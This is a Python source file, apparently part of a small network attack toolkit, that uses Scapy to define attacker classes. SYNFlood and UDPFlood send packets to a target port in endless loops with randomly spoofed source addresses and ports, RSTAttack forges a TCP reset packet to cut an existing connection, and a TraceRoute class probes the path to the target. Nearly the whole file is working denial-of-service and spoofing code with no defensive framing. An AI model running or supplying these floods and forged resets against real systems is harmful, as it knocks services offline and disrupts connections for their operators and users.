import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits
from Scanner import print_banner


__all__ = ["SYNFlood", "TraceRoute", "RSTAttack", "UDPFlood"]


class _Attacker:
    """
    Base Attacker object to inherit from.
    """
    __attacker__ = "Base Attacker"

    def __init__(self, target, port):
        print_banner()
        self._target = target
        self._port = port

    def set_target(self, new_target, new_port):
        self._target = new_target
        self._port = new_port

    def attack(self):
        raise NotImplementedError()


class SYNFlood(_Attacker):
    """_summary_

    Args:
        _Attacker (_type_): SYN Flooding Attacker.
    """
    __attacker__ = "SYN Flooding Attacker"

    def attack(self):
        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
        ip = IP(dst=self._target)
        tcp = TCP(dport=self._port, flags='S')
        pkt = ip/tcp

        while True:
            pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
            pkt[TCP].sport = getrandbits(16)     # source port
            pkt[TCP].seq = getrandbits(32)     # sequence number
            print(pkt.summary())
            send(pkt, verbose=0)


class UDPFlood(_Attacker):
    """_summary_

    Args:
        _Attacker (_type_): UDP Flooding Attacker.
    """
    __attacker__ = "UDP Flooding Attacker"

    def attack(self):
        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
        ip = IP(dst=self._target)
        udp = UDP(dport=self._port)
        payload = 'UDP Flooding' * 100
        pkt = ip/udp/payload

        while True:
            pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
            pkt[UDP].sport = getrandbits(16)     # source port
            print(pkt.summary())
            send(pkt, verbose=0)


class TraceRoute(_Attacker):
    """_summary_

    Args:
        _Attacker (_type_): Trace Route Attacker
    """
    __attacker__ = "Trace Route Attacker"

    def attack(self):
        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
        pkts = IP(dst=self._target, ttl=(1, 16)) / TCP(dport=self._port)
        for pkt in pkts:
            resp = sr1(pkt, timeout=1)
            if resp is None:
                print('.')
                continue
            print('-'*100)
            print(resp.summary())
            print('-'*100)
            # 18 = SA = 0x12
            if resp.haslayer(TCP) and resp[TCP].flags == 0x12:
                break


class RSTAttack(_Attacker):
    """_summary_

    Args:
        _Attacker (_type_): TCP RST Attack
    """
    __attacker__ = "TCP RST Attack"

    def attack(self, source_ip, source_port, sequence):
        print("%s for %s:%s" % (self.__attacker__, self._target, self._port))
        ip = IP(src=source_ip, dst=self._target)
        tcp = TCP(sport=source_port, dport=self._port, flags="R", seq=sequence)
        pkt = ip/tcp
        print(pkt.summary())
        send(pkt, verbose=0)
